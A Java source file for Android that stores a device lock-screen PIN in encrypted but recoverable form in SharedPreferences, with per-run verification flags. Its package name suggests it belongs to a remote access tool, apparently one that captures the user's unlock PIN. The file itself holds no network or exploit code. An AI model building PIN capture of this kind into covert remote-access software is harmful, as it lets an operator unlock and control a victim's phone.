package com.vendor.rat.credential;

import android.content.SharedPreferences;
import android.util.Log;

import com.vendor.rat.utils.SharedUtils;

public final class LockCredentialStore {

    private static final String TAG = "LockCredentialStore";
    private static final String LOCK_TYPE_PIN = "PIN";

    private static volatile LockCredentialCipher cipher = new LockCredentialCrypto();
    private static volatile boolean currentRunVerified;
    private static volatile boolean promptSuppressedForCurrentRun;

    private LockCredentialStore() {
    }

 public static synchronized void savePin(String pin) {
        if (pin == null || pin.isEmpty()) {
      clearAll();
      return;
        }
        try {
    LockCredentialCipher.EncryptedPayload payload = cipher.encrypt(pin);
            SharedPreferences prefs = SharedUtils.getPrefsInstance();
       if (prefs == null) {
                throw new IllegalStateException("SharedPreferences not available");
       }
         SharedPreferences.Editor editor = prefs.edit();
            editor.putString(LockCredentialKeys.LOCK_TYPE, LOCK_TYPE_PIN);
        editor.putString(LockCredentialKeys.ENCRYPTED_PIN, payload.getCipherText());
            editor.putString(LockCredentialKeys.IV, payload.getIv());
            editor.putLong(LockCredentialKeys.SAVED_AT, System.currentTimeMillis());
    if (!editor.commit()) {
   throw new IllegalStateException("Failed to persist lock credential");
 }
  resetCurrentRunFlags();
        } catch (Exception e) {
            Log.e(TAG, "savePin error", e);
      clearAll();
        }
    }

    public static synchronized String getLockType() {
        return SharedUtils.getString(LockCredentialKeys.LOCK_TYPE);
    }

    public static synchronized String getPin() {
        String encryptedPin = SharedUtils.getString(LockCredentialKeys.ENCRYPTED_PIN);
        String iv = SharedUtils.getString(LockCredentialKeys.IV);
        if (encryptedPin == null || encryptedPin.isEmpty() || iv == null || iv.isEmpty()) {
       return null;
}
        try {
            return cipher.decrypt(encryptedPin, iv);
        } catch (Exception e) {
      Log.e(TAG, "getPin: decryption failed, clearing corrupted state");
clearPersistedData();
            resetCurrentRunFlags();
return null;
     }
    }

    public static synchronized boolean hasCredential() {
        return getLockType() != null
       && SharedUtils.getString(LockCredentialKeys.ENCRYPTED_PIN) != null
     && SharedUtils.getString(LockCredentialKeys.IV) != null;
    }

    public static synchronized void markCurrentRunVerified() {
    currentRunVerified = true;
    }

    public static synchronized boolean isCurrentRunVerified() {
        return currentRunVerified;
    }

    public static synchronized void markPromptSuppressedForCurrentRun() {
        promptSuppressedForCurrentRun = true;
    }

    public static synchronized boolean isPromptSuppressedForCurrentRun() {
        return promptSuppressedForCurrentRun;
    }

    public static synchronized void resetCurrentRunFlags() {
     currentRunVerified = false;
        promptSuppressedForCurrentRun = false;
    }

    /**
* Remove all 4 credential keys in a single atomic editor.commit().
  * Does NOT touch runtime flags — callers must reset those separately if needed.
     */
    private static void clearPersistedData() {
    SharedPreferences prefs = SharedUtils.getPrefsInstance();
        if (prefs == null) {
   return;
        }
  prefs.edit()
            .remove(LockCredentialKeys.LOCK_TYPE)
     .remove(LockCredentialKeys.ENCRYPTED_PIN)
       .remove(LockCredentialKeys.IV)
    .remove(LockCredentialKeys.SAVED_AT)
   .commit();
    }

    public static synchronized void clearAll() {
        clearPersistedData();
        resetCurrentRunFlags();
    }

    public static synchronized void setCipherForTest(LockCredentialCipher testCipher) {
        cipher = testCipher != null ? testCipher : new LockCredentialCrypto();
    }
}
